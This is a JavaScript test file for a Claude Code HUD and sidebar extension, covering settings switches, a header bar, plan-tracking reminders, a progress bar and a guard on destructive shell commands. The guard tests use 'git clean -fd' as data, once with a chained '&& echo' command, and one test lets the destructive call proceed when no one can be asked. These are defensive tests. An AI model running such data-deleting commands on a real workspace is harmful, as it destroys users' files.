    expect(textsOf(find(tree, 'card-settings')).includes('5 of 6 on')).toBe(true);
});

// ---- the presses, through the real hooks

async function setFolded(h, key, probe, folded) {
    const tree = await h.pane('desktop');
    const isFolded = !hasKey(tree, probe);
    if (isFolded !== folded) await find(tree, 'b-' + key).onPress();
}

async function livePane(extra) {
    const h = await sidebarSession({ surfaces: ['desktop'], placed: true });
    h.ctx.ui.resolve = () => withSelect;
    h.ctx.session.messages = async () => [];
    if (extra) await extra(h);
    await h.start();
    return h;
}

test('pressing a switch flips the same setting /hud flips', async () => {
    const h = await livePane();
    await h.say('suggest on');
    const tree = await h.pane('desktop');
    await find(tree, 'sw-b-suggest').onPress();
    expect((await h.say('suggest')).text.includes('Suggestions are off')).toBe(true);
    await find(await h.pane('desktop'), 'sw-b-suggest').onPress();
    expect((await h.say('suggest')).text.includes('Suggestions are on')).toBe(true);
});

test('every switch flips its own setting and nothing else', async () => {
    const h = await livePane();
    const ask = { know: 'know', blast: 'blast', confirm: 'confirm', track: 'track', suggest: 'suggest' };
    const word = { know: 'Heads up is', blast: 'Blast radius is', confirm: 'Asking near the limit is', track: 'Plan tracking is', suggest: 'Suggestions are' };
    for (const k of Object.keys(ask)) await h.say(k + ' on');

    for (const k of Object.keys(ask)) {
        await find(await h.pane('desktop'), 'sw-b-' + k).onPress();
        for (const other of Object.keys(ask)) {
            const text = (await h.say(ask[other])).text;
            const expected = other === k ? 'off' : 'on';
            expect(text.includes(word[other] + ' ' + expected)).toBe(true);
        }
        await find(await h.pane('desktop'), 'sw-b-' + k).onPress();
    }
});

test('the routing switch turns routing off and on again', async () => {
    const h = await livePane();
    await h.say('on');
    await find(await h.pane('desktop'), 'sw-b-routing').onPress();
    expect(textsOf(await h.pane('desktop')).includes('manual')).toBe(true);
    await find(await h.pane('desktop'), 'sw-b-routing').onPress();
    expect(textsOf(await h.pane('desktop')).includes('auto')).toBe(true);
});

test('a switch pressed is kept for next time', async () => {
    const saved = {};
    const h = await livePane(async (live) => { live.ctx.store = { get: async (k) => saved[k], set: async (k, v) => { saved[k] = v; } }; });
    await h.say('blast on');
    await find(await h.pane('desktop'), 'sw-b-blast').onPress();
    expect(saved.prefs.blastOn).toBe(false);
    await find(await h.pane('desktop'), 'sw-b-blast').onPress();
    expect(saved.prefs.blastOn).toBe(true);
});

test('a switch that fails to save still flips', async () => {
    const h = await livePane(async (live) => { live.ctx.store = { get: async () => undefined, set: async () => { throw new Error('disk full'); } }; });
    await h.say('know on');
    await find(await h.pane('desktop'), 'sw-b-know').onPress();
    expect((await h.say('know')).text.includes('Heads up is off')).toBe(true);
    await h.say('know on');
});

test('picking a model for a tier changes that tier', async () => {
    const h = await livePane();
    // Folded by default, so open it the way a person would.
    await setFolded(h, 'models', 'm-top', false);
    const tree = await h.pane('desktop');
    const before = find(tree, 'm-fast').value;
    const other = before === 'claude-opus-5-5' ? 'claude-haiku-5-5' : 'claude-opus-5-5';
    await find(tree, 'm-fast').onSelect(other);
    expect(find(await h.pane('desktop'), 'm-fast').value).toBe(other);
    await find(await h.pane('desktop'), 'm-fast').onSelect(before);
    expect(find(await h.pane('desktop'), 'm-fast').value).toBe(before);
    await setFolded(h, 'models', 'm-top', true);
});

test('a model picked by hand shows as pinned, and one press gives routing back', async () => {
    const h = await livePane();
    await hookOf(h, 'classic.PreModelSwitch').handler(h.ctx, {}, h.next);
    const pinned = await h.pane('desktop');
    expect(hasKey(pinned, 'hd-auto')).toBe(true);
    await find(pinned, 'hd-auto').onPress();
    expect(hasKey(await h.pane('desktop'), 'hd-auto')).toBe(false);
});

test('folding a card is kept across redraws', async () => {
    const h = await livePane();
    await setFolded(h, 'models', 'm-top', true);
    const before = await h.pane('desktop');
    expect(hasKey(before, 'm-fast')).toBe(false);
    await find(before, 'b-models').onPress();
    expect(hasKey(await h.pane('desktop'), 'm-fast')).toBe(true);
    await find(await h.pane('desktop'), 'b-models').onPress();
    expect(hasKey(await h.pane('desktop'), 'm-fast')).toBe(false);
});

// ---- the guard, through the real Bash hook

async function guardedRun(h, answer, command) {
    h.ctx.ui.ask = async () => { if (answer === 'throw') throw new Error('nobody to ask'); return answer; };
    h.ctx.process = { run: async () => ({ exitCode: 0, stdout: 'a\nb\nc\n' }) };
    const hook = hookOf(h, 'tool.call', (m) => m && m.tool === 'Bash');
    return hook.handler(h.ctx, { tool: 'Bash', command }, h.next);
}

test('a destructive command you ran is remembered as run, with the number that was shown', async () => {
    const h = await livePane();
    await h.say('blast on');
    await guardedRun(h, 'Run it', 'git clean -fd');
    await setFolded(h, 'guard', 'g-seen', false);
    const text = textsOf(find(await h.pane('desktop'), 'card-guard'));
    expect(text.includes('This deletes 3 untracked paths')).toBe(true);
    expect(text.includes('you ran it')).toBe(true);
    await setFolded(h, 'guard', 'g-seen', true);
});

test('one you cancelled is remembered as cancelled, and the call is refused', async () => {
    const h = await livePane();
    await h.say('blast on');
    const out = await guardedRun(h, 'Cancel', 'git clean -fd');
    expect(typeof out.deny).toBe('string');
    await setFolded(h, 'guard', 'g-seen', false);
    expect(textsOf(find(await h.pane('desktop'), 'card-guard')).includes('you cancelled it')).toBe(true);
    await setFolded(h, 'guard', 'g-seen', true);
});

test('with nobody to ask, it is remembered as not asked and the call goes on', async () => {
    const h = await livePane();
    await h.say('blast on');
    const out = await guardedRun(h, 'throw', 'git clean -fd');
    expect(out.deny).toBe(undefined);
    await setFolded(h, 'guard', 'g-seen', false);
    expect(textsOf(find(await h.pane('desktop'), 'card-guard')).includes('went to the usual prompt')).toBe(true);
    await setFolded(h, 'guard', 'g-seen', true);
});

test('the command itself is never kept anywhere the sidebar can show it', async () => {
    const h = await livePane();
    await h.say('blast on');
    await guardedRun(h, 'Run it', 'git clean -fd && echo TOPSECRETTOKEN');
    await setFolded(h, 'guard', 'g-seen', false);
    const shown = textsOf(await h.pane('desktop'));
    // Flagged, so the absence below is not just a command nobody looked at.
    expect(shown.includes('This deletes')).toBe(true);
    expect(shown.includes('TOPSECRETTOKEN')).toBe(false);
    await setFolded(h, 'guard', 'g-seen', true);
});

// ---- what the strip leaves to the sidebar

test('with the sidebar showing, a heads-up and the follow-ups are in it and not above the prompt', async () => {
    const h = await livePane();
    await h.say('know on');
    await h.say('suggest on');
    const long = 'The retry logic now backs off exponentially and the config default changed from three to five. '.repeat(8);
    h.ctx.session.messages = async () => [
        { role: 'user', text: 'tighten the retries', toolUses: [] },
        { role: 'assistant', text: long, toolUses: [] },
    ];
    const replies = ['Run the retry tests\nUpdate the docs\nAdd a backoff test', 'The default changed but the docs still say three.'];
    h.ctx.model = { complete: async () => ({ isAnswered: true, text: replies.shift() || 'NONE' }) };
    h.ctx.prompt = { submit: () => undefined };
    const done = hookOf(h, 'turn.complete');
    // Three turns, so the heads-up check is due.
    for (let i = 0; i < 3; i += 1) {
        replies.splice(0, replies.length, 'Run the retry tests\nUpdate the docs\nAdd a backoff test', 'The default changed but the docs still say three.');
        await done.handler(h.ctx, { answer: long, isAborted: false, durationMs: 1000, usage: { input_tokens: 1, output_tokens: 1, cache_read_input_tokens: 0, cache_creation_input_tokens: 0 } }, async () => ({ text: long }));
    }
    const side = await h.pane('desktop');
    expect(hasKey(side, 'card-heads')).toBe(true);
    expect(hasKey(side, 'card-next')).toBe(true);

    const band = await h.band('desktop');
    expect(hasKey(band, 'hud-heads')).toBe(false);
    expect(hasKey(band, 'hud-next')).toBe(false);
});

test('with no sidebar showing, the strip keeps its heads-up and follow-ups', async () => {
    const h = await sidebarSession({ surfaces: ['desktop'], placed: false });
    h.ctx.session.messages = async () => [];
    await h.say('know on');
    await h.say('suggest on');
    const long = 'The retry logic now backs off exponentially and the config default changed from three to five. '.repeat(8);
    h.ctx.session.messages = async () => [
        { role: 'user', text: 'tighten the retries', toolUses: [] },
        { role: 'assistant', text: long, toolUses: [] },
    ];
    h.ctx.model = { complete: async () => ({ isAnswered: true, text: 'The default changed but the docs still say three.' }) };
    const done = hookOf(h, 'turn.complete');
    for (let i = 0; i < 3; i += 1) await done.handler(h.ctx, { answer: long, isAborted: false, durationMs: 1000 }, async () => ({ text: long }));
    const band = await h.band('desktop');
    expect(hasKey(band, 'hud-heads')).toBe(true);
});

test('a finished turn adds to the activity, and a subagent turn does not', async () => {
    const h = await livePane();
    h.ctx.model = { complete: async () => ({ isAnswered: false, reason: 'empty-reply' }) };
    h.ctx.prompt = { submit: () => undefined };
    const done = hookOf(h, 'turn.complete');
    const usage = { input_tokens: 10, output_tokens: 5, cache_read_input_tokens: 90, cache_creation_input_tokens: 0 };
    await done.handler(h.ctx, { answer: 'ok', isAborted: false, durationMs: 4000, usage }, async () => ({ text: 'ok' }));
    const one = textsOf(find(await h.pane('desktop'), 'card-activity'));
    expect(one.includes('90%')).toBe(true);
    await done.handler(h.ctx, { answer: 'ok', isAborted: false, durationMs: 4000, usage, agentId: 'sub-1' }, async () => ({ text: 'ok' }));
    const two = find(await h.pane('desktop'), 'ac-turns');
    expect(textsOf(two).includes('1')).toBe(true);
    expect(textsOf(two).includes('2')).toBe(false);
});

// ============================================================ review fixes

test('an update that errored does not become a task, or change one', async () => {
    const tasks = [{ id: '1', subject: 'a', activeForm: '', status: 'pending' }, { id: '2', subject: 'b', activeForm: '', status: 'pending' }];
    const refused = { isError: true, text: 'No task with id 99' };
    expect(applyTaskTool(tasks, 'TaskUpdate', { taskId: '99', status: 'completed' }, refused).length).toBe(2);
    const same = applyTaskTool(tasks, 'TaskUpdate', { taskId: '1', status: 'completed' }, refused);
    expect(same.find((t) => t.id === '1').status).toBe('pending');
    // And a create that errored made nothing.
    expect(applyTaskTool(tasks, 'TaskCreate', { subject: 'c' }, refused).length).toBe(2);
});

test('a subagent working through its own tasks does not become the bar', async () => {
    const h = await livePane();
    const hook = hookOf(h, 'tool.call', (m) => m && Array.isArray(m.tool) ? m.tool.includes('TaskCreate') : (m && m.tool === 'TaskCreate'));
    const made = (id) => async () => ({ result: { task: { id, subject: 'sub ' + id } } });
    await hook.handler(h.ctx, { tool: 'TaskCreate', subject: 'sub 1', agentId: 'sub-1' }, made('1'));
    await hook.handler(h.ctx, { tool: 'TaskCreate', subject: 'sub 2', agentId: 'sub-1' }, made('2'));
    expect(hasKey(await h.pane('desktop'), 'card-progress')).toBe(false);
    expect((await h.say('plan')).text.includes('TaskCreate 0')).toBe(true);
});

test('the follow-ups are about the last prompt even when the model was picked by hand', async () => {
    const h = await livePane();
    await hookOf(h, 'classic.PreModelSwitch').handler(h.ctx, {}, h.next);
    await h.say('suggest on');
    await hookOf(h, 'prompt.submit').handler(h.ctx, { text: 'please refactor the zebra module' }, h.next);

    let asked = '';
    h.ctx.model = { complete: async (req) => { asked += String(req.prompt); return { isAnswered: false, reason: 'empty-reply' }; } };
    h.ctx.prompt = { submit: () => undefined };
    await hookOf(h, 'turn.complete').handler(h.ctx, { answer: 'I refactored it.', isAborted: false, durationMs: 1000 }, async () => ({ text: 'x' }));
    expect(asked.includes('zebra')).toBe(true);
    await h.say('auto');
});

// ============================================ the wording that was tried on real sessions

test('it is an instruction given before the first tool call, not a suggestion', async () => {
    // A softer "you could keep a task list" was tried and a real session ignored it.
    const text = trackingNudge(['TaskCreate', 'TaskUpdate', 'ToolSearch']);
    expect(text.includes('Before your first tool call')).toBe(true);
    expect(text.includes('required')).toBe(true);
});

test('when the task tools are listed but their schemas are behind ToolSearch, it says how to load them', async () => {
    // Claude Code lists them among the offered tools and still defers their schemas.
    const text = trackingNudge(['TaskCreate', 'TaskUpdate', 'ToolSearch']);
    expect(text.includes('select:TaskCreate,TaskUpdate')).toBe(true);
});

test('when ToolSearch is not there it does not tell Claude to use it', async () => {
    expect(trackingNudge(['TaskCreate', 'TaskUpdate']).includes('ToolSearch')).toBe(false);
    expect(trackingNudge(['TodoWrite']).includes('ToolSearch')).toBe(false);
});

test('TodoWrite is used where it is the list that exists, even with ToolSearch about', async () => {
    const text = trackingNudge(['TodoWrite', 'ToolSearch']);
    expect(text.includes('TodoWrite')).toBe(true);
    expect(text.includes('TaskCreate')).toBe(false);
});

test('it tells Claude that the person is watching a bar, and to skip small things', async () => {
    const text = trackingNudge(['TaskCreate', 'TaskUpdate']);
    expect(text.includes('progress bar')).toBe(true);
    expect(text.includes('single small edits')).toBe(true);
});


// ======================================================= the terminal's header bar
//
// A long reply ends on the line above the HUD, and with nothing between them
// the strip reads as the reply's last sentence. The header bar is a full-width
// band that opens the HUD: a badge, the model and how it was chosen on the
// left, the next reset on the right.

const HNOW = Date.UTC(2026, 9, 21, 12, 0, 0);
const hstate = (over) => ({
    model: 'fable 5.1', pinned: false, routing: true, reason: 'base work',
    rateLimits: [
        { kind: 'five_hour', percentUsed: 58, resetsAt: Math.floor(HNOW / 1000) + 56 * 60 },
        { kind: 'seven_day', percentUsed: 15, resetsAt: Math.floor(HNOW / 1000) + 32 * 3600 },
    ],
    ...over,
});
const leftText = (h) => h.left.map((p) => p.text).join('');

test('the header opens with a solid badge, the model and how it was chosen', async () => {
    const h = headerBar(hstate(), 110, { now: HNOW });
    expect(h.left[0].text).toBe(' HUD ');
    expect(h.left[0].bg).toBe(BADGE_BG);
    expect(leftText(h).includes('fable 5.1')).toBe(true);
    expect(leftText(h).includes('auto')).toBe(true);
});

test('a pinned model says pinned and is amber, and a manual one says manual', async () => {
    const pinned = headerBar(hstate({ pinned: true }), 110, { now: HNOW });
    expect(leftText(pinned).includes('pinned')).toBe(true);
    expect(pinned.left.find((p) => p.text === 'fable 5.1').color).toBe(BAND_AMBER);
    const manual = headerBar(hstate({ routing: false }), 110, { now: HNOW });
    expect(leftText(manual).includes('manual')).toBe(true);
    expect(manual.left.find((p) => p.text === 'fable 5.1').color).toBe(BAND_CYAN);
});

test('the right side is the window that resets first, in words', async () => {
    expect(headerBar(hstate(), 110, { now: HNOW }).right).toBe('session resets in 56m ');
    // The week is the sooner one here.
    const week = hstate({ rateLimits: [
        { kind: 'five_hour', percentUsed: 5, resetsAt: Math.floor(HNOW / 1000) + 4 * 3600 },
        { kind: 'seven_day', percentUsed: 5, resetsAt: Math.floor(HNOW / 1000) + 90 * 60 },
    ] });
    expect(headerBar(week, 110, { now: HNOW }).right).toBe('week resets in 1h30m ');
});

test('a reset already past, or a spend limit, is never the one named', async () => {
    const odd = hstate({ rateLimits: [
        { kind: 'five_hour', percentUsed: 5, resetsAt: Math.floor(HNOW / 1000) - 600 },
        { kind: 'spend_limit', percentUsed: 5, resetsAt: Math.floor(HNOW / 1000) + 60 },
        { kind: 'seven_day', percentUsed: 5, resetsAt: Math.floor(HNOW / 1000) + 3 * 3600 },
    ] });
    expect(headerBar(odd, 110, { now: HNOW }).right).toBe('week resets in 3h ');
    expect(headerBar(hstate({ rateLimits: [] }), 110, { now: HNOW }).right).toBe('');
});

test('a narrow terminal drops the reset before anything on the left', async () => {
    const wide = headerBar(hstate(), HEADER_WIDE, { now: HNOW });
    const narrow = headerBar(hstate(), HEADER_WIDE - 1, { now: HNOW });
    expect(wide.right === '').toBe(false);
    expect(narrow.right).toBe('');
    expect(leftText(narrow).includes('fable 5.1')).toBe(true);
});

test('the reason is shown when there is room and cut with an ellipsis when there is not', async () => {
    const long = hstate({ reason: 'planning work, held at sonnet 5.5 to spare the five-hour window' });
    expect(leftText(headerBar(long, 110, { now: HNOW })).includes('planning work')).toBe(true);
    const tight = headerBar(long, 60, { now: HNOW });
    expect(leftText(tight).endsWith('…')).toBe(true);
    expect(leftText(tight).includes('five-hour window')).toBe(false);
});

test('with no room for a reason it is left out whole rather than shown as a stub', async () => {
    const h = headerBar(hstate({ reason: 'base work' }), 30, { now: HNOW });
    // Exactly the badge, the model and how it was chosen, and nothing after.
    expect(leftText(h)).toBe(' HUD  fable 5.1 · auto');
});

test('the header never runs past the terminal, at any width it can fit in', async () => {
    // Below 24 columns the badge and the model alone are wider than the
    // terminal, and the row is cut by the layout rather than by this.
    for (let cols = 24; cols <= 160; cols += 1) {
        const h = headerBar(hstate({ reason: 'planning work, held at sonnet 5.5 to spare the window' }), cols, { now: HNOW });
        const used = leftText(h).length + h.right.length;
        expect(used <= cols).toBe(true);
    }
});

test('a terminal that is not UTF-8 gets a header of plain characters', async () => {
    const h = headerBar(hstate({ reason: 'planning work, held at sonnet 5.5 to spare the five-hour window' }), 60, { ascii: true, now: HNOW });
    const all = leftText(h) + h.right;
    expect(/^[\x20-\x7e]*$/.test(all)).toBe(true);
    expect(all.includes('...')).toBe(true);
});

test('the strip under the header does not say the model a second time', async () => {
    const st = { ...hstate(), contextPercent: 41 };
    const withModel = layout(st, 110, {}).map((p) => p.text).join('');
    const without = layout(st, 110, { withModel: false }).map((p) => p.text).join('');
    expect(withModel.includes('fable 5.1')).toBe(true);
    expect(without.includes('fable 5.1')).toBe(false);
    expect(without.includes('Ctx')).toBe(true);
    expect(without.includes('Session')).toBe(true);
});

test('a strip with no model still fits and still sheds the way it did', async () => {
    const st = { ...hstate(), contextPercent: 41 };
    for (let cols = 30; cols <= 120; cols += 10) {
        const pieces = layout(st, cols, { withModel: false });
        expect(pieces.map((p) => p.text).join('').length <= Math.max(cols, 1)).toBe(true);
    }
});

// ---- through the real band

async function terminalSession() {
    const h = await sidebarSession({ surfaces: ['terminal'] });
    h.ctx.session.messages = async () => [];
    await h.start();
    return h;
}

test('on the terminal the header is the first row of the HUD, on its own band', async () => {
    const h = await terminalSession();
    const tree = await h.band('terminal');
    const head = find(tree, 'hud-head');
    expect(!!head).toBe(true);
    expect(head.backgroundColor).toBe(BAND_BG);
    expect(head.justifyContent).toBe('space-between');
    // First, so a long reply above cannot be read as running into the strip.
    // The rows sit in the rail, after the drawn bar that runs down its left.
    const rows = tree.type === 'Box' && tree.key === 'hud-head' ? [tree]
        : tree.children.filter((c) => c && c.key !== 'hud-rail-bar');
    expect(rows[0].key).toBe('hud-head');
    expect(textsOf(head).includes('HUD')).toBe(true);
});

test('the model appears once on the terminal, in the header and not again in the strip', async () => {
    const h = await terminalSession();
    const tree = await h.band('terminal');
    const all = textsOf(tree);
    const hits = all.split('opus 5.5').length - 1;
    expect(hits).toBe(1);
});

test('the badge is drawn on the violet, and the band text carries its own colour', async () => {
    const h = await terminalSession();
    const head = find(await h.band('terminal'), 'hud-head');
    let badge = null;
    let plain = null;
    walk(head, (n) => {
        if (n.type !== 'Text') return;
        if ((n.children || []).join('') === ' HUD ') badge = n;
        else if (!plain && n.key && n.key.startsWith('hl') && n !== badge) plain = n;
    });
    expect(badge.backgroundColor).toBe(BADGE_BG);
    expect(badge.bold).toBe(true);
    // Self-contained: never the terminal's own default, which could be dark on dark.
    expect(typeof plain.color).toBe('string');
});

test('the desktop strip has no header, since it has its own look', async () => {
    const h = await sidebarSession({ surfaces: ['desktop'], placed: false });
    const tree = await h.band('desktop');
    expect(hasKey(tree, 'hud-head')).toBe(false);
});

// ======================================================= the mid-job reminder

test('nothing is said until a job has run a while with no plan', async () => {
    let r = { calls: 0, reminders: 0 };
    for (let i = 1; i < REMIND_AFTER; i += 1) {
        const step = reminderStep(r, { on: true, planned: false });
        expect(step.fire).toBe(false);
        r = step.r;
    }
    expect(reminderStep(r, { on: true, planned: false }).fire).toBe(true);
});

test('after speaking it waits a long while, and asks only so many times', async () => {
    let r = { calls: 0, reminders: 0 };
    let fired = 0;
    let gaps = [];
    let since = 0;
    for (let i = 0; i < 500; i += 1) {
        const step = reminderStep(r, { on: true, planned: false });
        since += 1;
        if (step.fire) { fired += 1; gaps.push(since); since = 0; }
        r = step.r;
    }
    expect(fired).toBe(REMIND_MAX);
    expect(gaps[0]).toBe(REMIND_AFTER);
    expect(gaps[1]).toBe(REMIND_EVERY);
});

test('a job with a plan is never reminded, and counting starts over for the next one', async () => {
    let r = { calls: 7, reminders: 2 };
    const planned = reminderStep(r, { on: true, planned: true });
    expect(planned.fire).toBe(false);
    expect(planned.r.calls).toBe(0);
    expect(planned.r.reminders).toBe(0);
});

test('with the switch off it says nothing and keeps no count', async () => {
    const step = reminderStep({ calls: 99, reminders: 0 }, { on: false, planned: false });
    expect(step.fire).toBe(false);
    expect(step.r.calls).toBe(0);
});

test('a damaged record is treated as a fresh start', async () => {
    for (const odd of [undefined, null, 'x', 7]) {
        const step = reminderStep(odd, { on: true, planned: false });
        expect(step.fire).toBe(false);
        expect(step.r.calls).toBe(1);
    }
});

test('the reminder says how to load the task tools, and what to do with them', async () => {
    const text = reminderText(['Bash', 'TaskCreate', 'TaskUpdate', 'ToolSearch']);
    expect(text.includes('select:TaskCreate,TaskUpdate')).toBe(true);
    // Several tasks: a plan of one is no bar, and one task for everything is what a model writes unprompted.
    expect(text.includes('at least three separate tasks')).toBe(true);
    expect(text.includes('never one task for everything')).toBe(true);
    expect(text.includes('in_progress')).toBe(true);
    // The session's own words for what is missing.
    expect(text.includes('No task list exists')).toBe(true);
});

test('it asks for TodoWrite where that is the list there is, and for the hud tool tool where there is none', async () => {
    const todos = reminderText(['Bash', 'TodoWrite']);
    expect(todos.includes('TodoWrite')).toBe(true);
    expect(todos.includes('TaskCreate')).toBe(false);
    expect(reminderText(['Bash', 'Read']).includes(HUD_TOOL)).toBe(true);
});

test('when the tools are not known yet it assumes the interactive ones', async () => {
    expect(reminderText(null).includes('TaskCreate')).toBe(true);
    expect(reminderText(undefined).includes('TaskCreate')).toBe(true);
});

test('the reminder contains no long dash', async () => {
    for (const tools of [null, ['TaskCreate', 'TaskUpdate', 'ToolSearch'], ['TodoWrite']]) {
        expect(reminderText(tools).includes(String.fromCharCode(8212))).toBe(false);
    }
});

// ---- through the real hook

const callHook = (h) => hookOf(h, 'tool.call', (m) => !m);
const ok = (extra) => async () => ({ ref: 3, text: 'done', result: { stdout: 'x' }, ...extra });

async function jobSession() {
    const h = await sidebarSession({ surfaces: ['terminal'] });
    h.ctx.session.messages = async () => [];
    await h.say('track on');
    await h.start();
    // The tools a real interactive request offers, learned at compose time.
    await hookOf(h, 'prompt.compose').handler(h.ctx, { tools: ['Bash', 'TaskCreate', 'TaskUpdate', 'ToolSearch'] }, async () => ({ sections: [] }));
    return h;
}

test('the eighth call of a job with no plan carries the reminder beside its result', async () => {
    const h = await jobSession();
    const hook = callHook(h);
    let last = null;
    for (let i = 0; i < REMIND_AFTER - 1; i += 1) {
        last = await hook.handler(h.ctx, { tool: 'Bash', command: 'ls' }, ok());
        expect(last.context).toBe(undefined);
    }
    last = await hook.handler(h.ctx, { tool: 'Bash', command: 'ls' }, ok());
    expect(Array.isArray(last.context)).toBe(true);
    expect(last.context[0].includes('No task list exists')).toBe(true);
    // The result itself is passed on untouched.
    expect(last.ref).toBe(3);
    expect(last.text).toBe('done');
    expect(last.result.stdout).toBe('x');
});

test('a reminder already on the result is kept, and ours goes after it', async () => {
    const h = await jobSession();
    const hook = callHook(h);
    for (let i = 0; i < REMIND_AFTER - 1; i += 1) await hook.handler(h.ctx, { tool: 'Bash' }, ok());
    const last = await hook.handler(h.ctx, { tool: 'Bash' }, ok({ context: ['from somewhere else'] }));
    expect(last.context.length).toBe(2);
    expect(last.context[0]).toBe('from somewhere else');
});

test('a subagent\'s calls are not the job being watched', async () => {
    const h = await jobSession();
    const hook = callHook(h);
    for (let i = 0; i < REMIND_AFTER * 3; i += 1) {
        const out = await hook.handler(h.ctx, { tool: 'Bash', agentId: 'sub-1' }, ok());
        expect(out.context).toBe(undefined);
    }
});

test('a refused or failed call is not progress and carries nothing', async () => {
    const h = await jobSession();
    const hook = callHook(h);
    for (let i = 0; i < REMIND_AFTER * 2; i += 1) {
        const denied = await hook.handler(h.ctx, { tool: 'Bash' }, async () => ({ deny: 'no' }));
        expect(denied.context).toBe(undefined);
        const failed = await hook.handler(h.ctx, { tool: 'Bash' }, async () => ({ isError: true, text: 'boom' }));
        expect(failed.context).toBe(undefined);
    }
});

test('searching for a tool, or using the task tools, does not count as the work', async () => {
    const h = await jobSession();
    const hook = callHook(h);
    for (const tool of ['ToolSearch', 'TaskCreate', 'TaskUpdate', 'TaskList', 'TodoWrite']) {
        for (let i = 0; i < REMIND_AFTER * 2; i += 1) {
            const out = await hook.handler(h.ctx, { tool }, ok());
            expect(out.context).toBe(undefined);
        }
    }
});

test('with plan tracking off no reminder is ever added', async () => {
    const h = await jobSession();
    await h.say('track off');
    const hook = callHook(h);
    for (let i = 0; i < REMIND_AFTER * 3; i += 1) {
        expect((await hook.handler(h.ctx, { tool: 'Bash' }, ok())).context).toBe(undefined);
    }
    await h.say('track on');
});

test('once a plan exists the reminders stop, and a finished one lets the next job start fresh', async () => {
    const h = await jobSession();
    const hook = callHook(h);
    for (let i = 0; i < REMIND_AFTER - 2; i += 1) await hook.handler(h.ctx, { tool: 'Bash' }, ok());
    // Claude writes a plan: two tasks, one under way.
    const create = hookOf(h, 'tool.call', (m) => m && m.tool === 'TaskCreate');
    await create.handler(h.ctx, { tool: 'TaskCreate', subject: 'one' }, async () => ({ result: { task: { id: 'r1', subject: 'one' } } }));
    await create.handler(h.ctx, { tool: 'TaskCreate', subject: 'two' }, async () => ({ result: { task: { id: 'r2', subject: 'two' } } }));
    for (let i = 0; i < REMIND_AFTER * 3; i += 1) {
        expect((await hook.handler(h.ctx, { tool: 'Bash' }, ok())).context).toBe(undefined);
    }
});

test('a session with no task tools is reminded to use the hud tool', async () => {
    const h = await sidebarSession({ surfaces: ['terminal'] });
    h.ctx.session.messages = async () => [];
    await h.say('track on');
    await h.start();
    await hookOf(h, 'prompt.compose').handler(h.ctx, { tools: ['Bash', 'Read'] }, async () => ({ sections: [] }));
    const hook = callHook(h);
    let said = '';
    for (let i = 0; i < REMIND_AFTER; i += 1) {
        const r = await hook.handler(h.ctx, { tool: 'Bash' }, ok());
        if (r.context && r.context.length) said = r.context.join(' ');
    }
    expect(said.includes(HUD_TOOL)).toBe(true);
});

test('a new session starts the count over', async () => {
    const h = await jobSession();
    const hook = callHook(h);
    for (let i = 0; i < REMIND_AFTER - 2; i += 1) await hook.handler(h.ctx, { tool: 'Bash' }, ok());
    await h.start();
    for (let i = 0; i < REMIND_AFTER - 1; i += 1) {
        expect((await hook.handler(h.ctx, { tool: 'Bash' }, ok())).context).toBe(undefined);
    }
});


// ======================================================= a bar that is real and moves while Claude works

const planOf = (statuses) => progressOf(statuses.map((s, i) => ({ content: 'step ' + i, status: s })));

test('a bar standing still has no motion in it: an idle frame is the same at every tick', async () => {
    const plan = planOf(['completed', 'completed', 'in_progress', 'pending', 'pending', 'pending']);
    const a = JSON.stringify(planBarFrame(plan, { cells: 20, working: false, tick: 0 }));
    for (const tick of [1, 2, 3, 7, 100, 12345]) {
        expect(JSON.stringify(planBarFrame(plan, { cells: 20, working: false, tick }))).toBe(a);
    }
});

test('and a working bar moves: a lighter band runs along what is finished', async () => {
    const plan = planOf(['completed', 'completed', 'completed', 'in_progress', 'pending', 'pending']);
    const frames = new Set();
    for (let tick = 0; tick < 30; tick += 1) {
        const pieces = planBarFrame(plan, { cells: 24, working: true, tick });
        expect(pieces.map((p) => p.text).join('').length).toBe(24);
        frames.add(JSON.stringify(pieces));
        // The band is the glow colour and only ever over solid blocks.
        for (const p of pieces) if (p.color === PLAN_GLOW) expect(/^█+$/.test(p.text)).toBe(true);
    }
    expect(frames.size > 6).toBe(true);
    // Somewhere in the loop the band is on the bar, and somewhere it is not.
    const lit = [...frames].filter((f) => f.includes(PLAN_GLOW)).length;
    expect(lit > 0 && lit < frames.size).toBe(true);
});

test('the step in hand is shown as a shade between finished and not started, and it breathes', async () => {
    const plan = planOf(['completed', 'in_progress', 'pending', 'pending']);
    const idle = planBarFrame(plan, { cells: 16, working: false, tick: 0 }).map((p) => p.text).join('');
    expect(idle).toBe('█'.repeat(4) + '▒'.repeat(4) + '░'.repeat(8));
    const seen = new Set();
    for (let tick = 0; tick < 12; tick += 1) {
        const t = planBarFrame(plan, { cells: 16, working: true, tick }).map((p) => p.text).join('');
        seen.add(t.slice(4, 8));
    }
    expect(seen.has('▓'.repeat(4))).toBe(true);
    expect(seen.has('▒'.repeat(4))).toBe(true);
});

test('a step in hand is at least one cell, and the bar is never full until the job is', async () => {
    const todos = [{ content: 'a', status: 'in_progress' }];
    for (let i = 0; i < 39; i += 1) todos.push({ content: 'x' + i, status: 'pending' });
    const text = planBarFrame(progressOf(todos), { cells: 16 }).map((p) => p.text).join('');
    expect(text.startsWith('▒')).toBe(true);
    const nearly = [];
    for (let i = 0; i < 39; i += 1) nearly.push({ content: 'x' + i, status: 'completed' });
    nearly.push({ content: 'last', status: 'in_progress' });
    const full = planBarFrame(progressOf(nearly), { cells: 16, working: true, tick: 5 }).map((p) => p.text).join('');
    expect(full.length).toBe(16);
    expect(full.endsWith('░') || full.endsWith('▒') || full.endsWith('▓')).toBe(true);
});

test('a finished job is a solid green bar, and the plain-text bar has no band to move', async () => {
    const done = planOf(['completed', 'completed']);
    expect(JSON.stringify(planBarFrame(done, { cells: 10, working: true, tick: 3 }))).toBe(JSON.stringify([{ text: '█'.repeat(10), color: PLAN_DONE }]));
    const plain = planBarFrame(planOf(['completed', 'in_progress', 'pending']), { ascii: true, cells: 12, working: true, tick: 4 });
    expect(plain.every((p) => /^[#=+-]+$/.test(p.text))).toBe(true);
});

// The blue has to survive a terminal that reports only sixteen colours.
// A terminal like that has every colour rounded to one of sixteen, by which of
// red, green and blue are past half (this is the rounding Claude Code's colour
// library does). #8f8cf4 has all three past half, so it came out bright white:
// the cream badge and bar of a Claude Code under tmux with TERM=screen.
const ansi16 = (hex) => {
    const [r, g, b] = [1, 3, 5].map((i) => parseInt(hex.slice(i, i + 2), 16));
    const v = Math.round(Math.max(r, g, b) / 255 * 100 / 50);
    if (v === 0) return 30;
    const n = 30 + ((Math.round(b / 255) << 2) | (Math.round(g / 255) << 1) | Math.round(r / 255));
    return v === 2 ? n + 60 : n;
};

